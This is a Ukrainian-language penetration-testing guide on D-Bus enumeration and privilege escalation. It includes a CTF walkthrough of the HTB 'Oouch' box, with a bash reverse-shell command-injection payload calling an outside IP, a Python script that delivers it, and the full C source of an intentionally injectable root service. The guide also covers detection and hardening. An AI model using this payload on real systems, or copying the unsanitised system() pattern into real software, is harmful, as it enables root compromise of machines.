# Перерахування D-Bus і підвищення привілеїв через ін'єкцію команд

## **Перерахування через GUI**

D-Bus використовується як посередник для міжпроцесної взаємодії (IPC) у середовищах робочого столу Ubuntu. В Ubuntu спостерігається одночасна робота кількох message bus: системної шини, яка переважно використовується **привілейованими сервісами для надання сервісів, важливих для всієї системи**, і session bus для кожного користувача, який увійшов у систему, що надає сервіси, важливі лише для цього конкретного користувача. Основна увага тут приділяється системній шині через її зв’язок із сервісами, що працюють із вищими привілеями (наприклад, root), оскільки наша мета — підвищення привілеїв. Зазначається, що архітектура D-Bus використовує «router» для кожної session bus, який відповідає за перенаправлення повідомлень клієнтів до відповідних сервісів на основі адреси, указаної клієнтами для сервісу, з яким вони хочуть взаємодіяти.<sup>[[1]](#references)</sup>

Сервіси в D-Bus визначаються через **об’єкти** та **інтерфейси**, які вони надають. Об’єкти можна порівняти з екземплярами класів у стандартних OOP-мовах, причому кожен екземпляр однозначно ідентифікується через **object path**. Цей шлях, подібно до шляху файлової системи, однозначно ідентифікує кожен об’єкт, наданий сервісом. Ключовим інтерфейсом для дослідження є інтерфейс **org.freedesktop.DBus.Introspectable**, який містить один метод — Introspect. Цей метод повертає XML-представлення методів, сигналів і властивостей, які підтримує об’єкт; тут основна увага приділяється методам, а властивості та сигнали не розглядаються.

Для взаємодії з інтерфейсом D-Bus використовувалися два інструменти: CLI-інструмент **gdbus** для зручного виклику методів, наданих D-Bus, у скриптах, і [**D-Feet**](https://wiki.gnome.org/Apps/DFeet) — GUI-інструмент на основі Python, призначений для перерахування сервісів, доступних у кожній шині, і відображення об’єктів, що містяться в кожному сервісі.
```bash
sudo apt-get install d-feet
```
Якщо ви перевіряєте **session bus**, спочатку підтвердьте поточну адресу:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

На першому зображенні показано services, зареєстровані в системній шині D-Bus, причому **org.debin.apt** спеціально виділено після вибору кнопки System Bus. D-Feet запитує цей service щодо об'єктів, відображаючи interfaces, methods, properties і signals для вибраних об'єктів, як видно на другому зображенні. Також наведено сигнатуру кожного method.

Важливою особливістю є відображення **ідентифікатора процесу service (pid)** і **командного рядка**, що корисно для перевірки, чи працює service з підвищеними привілеями, які мають важливе значення для дослідження.

**D-Feet також дозволяє викликати methods**: користувачі можуть вводити Python expressions як параметри, які D-Feet перетворює на типи D-Bus перед передаванням service.

Однак зверніть увагу, що **деякі methods потребують authentication** перед тим, як дозволити їх виклик. Ми проігноруємо ці methods, оскільки наша мета — підвищити привілеї без credentials із самого початку.

Також зверніть увагу, що деякі services запитують інший D-Bus service під назвою org.freedeskto.PolicyKit1, чи слід дозволити користувачеві виконувати певні дії.

## **Перерахування командного рядка**

### Перелік об'єктів service

Можна переглянути відкриті D-Bus interfaces за допомогою:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Сервіси, позначені як **`(activatable)`**, особливо цікаві, оскільки вони **ще не запущені**, але запит до шини може запустити їх на вимогу. Не зупиняйтеся на `busctl list`; зіставте ці імена з фактичними бінарними файлами, які вони запускатимуть.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Це швидко показує, який шлях `Exec=` буде запущено для активованого імені та від імені якої ідентичності. Якщо бінарний файл або ланцюжок його виконання захищені недостатньо, неактивна служба все одно може стати шляхом до privilege escalation.

#### З'єднання

[З wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Коли процес встановлює з'єднання з шиною, шина призначає цьому з'єднанню спеціальне ім'я шини, яке називається _унікальним іменем з'єднання_. Імена шин цього типу є незмінними — гарантовано, що вони не зміняться, доки існує з'єднання, — і, що важливіше, їх не можна повторно використати протягом усього часу існування шини. Це означає, що жодне інше з'єднання з цією шиною ніколи не отримає такого унікального імені з'єднання, навіть якщо той самий процес закриє з'єднання з шиною та створить нове. Унікальні імена з'єднань легко розпізнати, оскільки вони починаються з інакше забороненого символу двокрапки.<sup>[[4]](#references)</sup>

### Інформація про об'єкт служби

Після цього можна отримати певну інформацію про інтерфейс за допомогою:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Також зіставте ім’я шини з відповідним `systemd` unit і шляхом до виконуваного файла:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Це відповідає на практичне питання, яке має значення під час privesc: **якщо виклик методу успішний, який реальний бінарний файл і unit виконають дію?**

### Перелік інтерфейсів об’єкта service

Потрібно мати достатньо дозволів.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Інспектування інтерфейсу об'єкта служби

Зверніть увагу, що в цьому прикладі було вибрано найновіший виявлений інтерфейс за допомогою параметра `tree` (_див. попередній розділ_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Зверніть увагу на метод `.Block` інтерфейсу `htb.oouch.Block` (саме той, який нас цікавить). Літера "s" в інших стовпцях може означати, що метод очікує рядок.

Перш ніж спробувати щось небезпечне, спочатку перевірте **метод, орієнтований на читання**, або інший метод із низьким ризиком. Це чітко розділяє три випадки: неправильний синтаксис, метод доступний, але доступ заборонено, або метод доступний і дозволений.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

Introspection показує, **що** ви можете викликати, але не показує, **чому** виклик дозволено або заборонено. Для реального privesc triage зазвичай потрібно одночасно перевірити **три рівні**:

1. **Activation metadata** (`.service` files або `SystemdService=`), щоб з’ясувати, який binary і unit фактично буде запущено.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), щоб з’ясувати, хто може `own`, `send_destination` або `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`), щоб з’ясувати модель авторизації за замовчуванням (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Корисні команди:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Не припускайте відповідність 1:1 між методом D-Bus і дією Polkit. Той самий метод може вибирати іншу дію залежно від об’єкта, який змінюється, або контексту виконання. Тому практичний workflow такий:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` і пошук у відповідних `.policy` файлах
3. низькоризикові live probes за допомогою `busctl call`, `gdbus call` або `dbusmap --enable-probes --null-agent`

Proxy або compatibility services потребують особливої уваги. **Proxy, запущений від root**, який пересилає запити до іншого D-Bus service через власне заздалегідь встановлене з’єднання, може випадково змусити backend вважати, що кожен запит надходить від UID 0, якщо ідентифікацію початкового caller не перевірено повторно.<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

Маючи достатні privileges (одних лише privileges `send_destination` і `receive_sender` недостатньо), ви можете **monitor D-Bus communication**.

Щоб **monitor** **communication**, ви маєте бути **root**. Якщо, працюючи від root, ви все одно виявляєте проблеми, перевірте [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) і [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Якщо ви знаєте, як налаштувати конфігураційний файл D-Bus, щоб **allow non root users to sniff** communication, будь ласка, **contact me**!

Різні способи monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
У наведеному прикладі інтерфейс `htb.oouch.Block` відстежується, і **повідомлення "**_**lalalalal**_**" надсилається через miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Ви можете використовувати `capture` замість `monitor`, щоб зберегти результати у файлі **pcapng**, який може відкрити Wireshark:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Фільтрація всього шуму <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Якщо в шині надто багато інформації, передайте правило відповідності таким чином:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Можна вказати кілька правил. Якщо повідомлення відповідає _будь-якому_ з правил, його буде виведено. Наприклад:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Дивіться [документацію D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html), щоб отримати більше інформації про синтаксис match rule.<sup>[[7]](#references)</sup>

### Більше

`busctl` має ще більше опцій, [**знайдіть їх усі тут**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Вразливий сценарій**

Як користувач **qtc всередині хоста "oouch" з HTB**, ви можете знайти **неочікуваний конфігураційний файл D-Bus**, розташований у _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
З попередньої конфігурації відомо, що **для надсилання й отримання інформації** через цей D-BUS communication ви маєте бути користувачем `root` або `www-data`.

Як користувач **qtc** всередині Docker container **aeb4525789d8** ви можете знайти код, пов’язаний із dbus, у файлі _/code/oouch/routes.py._ Ось цікавий фрагмент коду:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Як бачите, він **підключається до D-Bus interface** і надсилає до **"Block" function** значення "client_ip".

На іншому боці D-Bus connection працює скомпільований C binary. Цей код **прослуховує** D-Bus connection, **очікуючи IP address, і викликає iptables через `system` function**, щоб заблокувати вказану IP address.\
**Виклик `system` навмисно вразливий до command injection**, тому такий payload створить reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Експлуатація

Наприкінці цієї сторінки ви знайдете **повний C code D-Bus application**. У ньому, між рядками 91–97, можна побачити, **як зареєстровано `D-Bus object path`** та **`interface name`**. Ця інформація буде необхідна для надсилання даних до D-Bus connection:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Також у рядку 57 можна побачити, що **єдиний зареєстрований метод** для цього D-Bus communication називається `Block`(_**Саме тому в наступному розділі payload-и надсилатимуться до service object `htb.oouch.Block`, interface `/htb/oouch/Block` і method name `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Наведений нижче код на Python надсилає payload до D-Bus connection через метод `Block` за допомогою `block_iface.Block(runme)` (_зверніть увагу, що його було вилучено з попереднього фрагмента коду_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl і dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` — це інструмент, який використовується для надсилання повідомлень до “Message Bus”
- Message Bus — програмне забезпечення, яке системи використовують для спрощення комунікації між застосунками. Він пов’язаний із Message Queue (повідомлення впорядковані в послідовність), але в Message Bus повідомлення надсилаються за subscription model і також дуже швидко.
- Тег “-system” використовується, щоб позначити, що це system message, а не session message (за замовчуванням).
- Тег “–print-reply” використовується для належного виведення нашого повідомлення та отримання будь-яких відповідей у зручному для читання форматі.
- “–dest=Dbus-Interface-Block” — адреса Dbus interface.
- “–string:” — тип повідомлення, яке ми хочемо надіслати до interface. Існує кілька форматів надсилання повідомлень, як-от double, bytes, booleans, int, objpath. Серед них “object path” корисний, коли ми хочемо надіслати шлях до файлу в Dbus interface. У цьому випадку ми можемо використати спеціальний файл (FIFO), щоб передати команду до interface під виглядом імені файлу. “string:;” — це повторний виклик object path, куди ми поміщаємо FIFO reverse shell file/command.

_Зверніть увагу, що в `htb.oouch.Block.Block` перша частина (`htb.oouch.Block`) посилається на service object, а остання частина (`.Block`) посилається на назву методу._

### Код C
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

Ручне перерахування великої attack surface D-Bus за допомогою `busctl`/`gdbus` швидко стає складним. Дві невеликі FOSS-утиліти, випущені протягом останніх кількох років, можуть пришвидшити роботу під час red-team або CTF-операцій:

### dbusmap ("Nmap for D-Bus")
* Автор: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Написана мовою C; один статично скомпільований binary (<50 kB), який обходить кожен object path, отримує XML `Introspect` і визначає PID/UID власника.<sup>[[5]](#references)</sup>
* Корисні flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Інструмент позначає незахищені well-known names символом `!`, миттєво виявляючи сервіси, якими ви можете *оволодіти* (перехопити), або виклики методів, доступні з shell непривілейованого користувача.

### uptux.py
* Автор: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Скрипт лише на Python, який шукає *доступні для запису* paths у systemd units **і** надто permissive D-Bus policy files (наприклад, `send_destination="*"`).<sup>[[6]](#references)</sup>
* Швидке використання:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Модуль D-Bus шукає у наведених нижче directories і виділяє будь-який service, який може бути spoofed або hijacked звичайним користувачем:
* `/etc/dbus-1/system.d/` і `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Відстеження нещодавно опублікованих CVE допомагає виявляти подібні insecure patterns у custom code. Двома хорошими нещодавніми прикладами є:<sup>[[2]](#references)[[3]](#references)</sup>

| Рік | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service, який працює від root, надавав D-Bus interface, який непривілейовані користувачі могли переналаштовувати, зокрема завантажувати контрольовану attacker-ом macro behavior. | Якщо daemon надає **device/profile/config management** у system bus, розглядайте writable configuration і macro features як primitives для code execution, а не просто як "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Compatibility proxy, який працює від root, перенаправляв requests до backend services без збереження початкового security context caller-а, тому backends довіряли proxy як UID 0. | Розглядайте **proxy / bridge / compatibility** D-Bus services як окремий bug class: якщо вони relay privileged calls, перевіряйте, як caller UID/Polkit context передається до backend. |

Варто звернути увагу на такі patterns:
1. Service працює **як root у system bus**.
2. Або **відсутня authorization check**, або перевірка виконується щодо **неправильного subject**.
3. Доступний method зрештою змінює system state: package install, зміни user/group, bootloader config, оновлення device profile, записи у files або direct command execution.

Використовуйте `dbusmap --enable-probes` або ручний `busctl call`, щоб підтвердити доступність методу, після чого перевірте service policy XML і Polkit actions, щоб зрозуміти, **який subject** фактично проходить authorization.

---

## Hardening & Detection Quick-Wins

* Шукайте world-writable або *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Вимагайте Polkit для небезпечних methods – навіть *root* proxies повинні передавати PID *caller-а* до `polkit_authority_check_authorization_sync()`, а не власний.
* Знижуйте privileges у long-running helpers (використовуйте `sd_pid_get_owner_uid()`, щоб перемикати namespaces після підключення до bus).
* Якщо ви не можете видалити service, принаймні *scope* його до dedicated Unix group і обмежте доступ у його XML policy.
* Blue-team: захоплюйте system bus за допомогою `busctl capture > /var/log/dbus_$(date +%F).pcapng` та імпортуйте його у Wireshark для anomaly detection.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
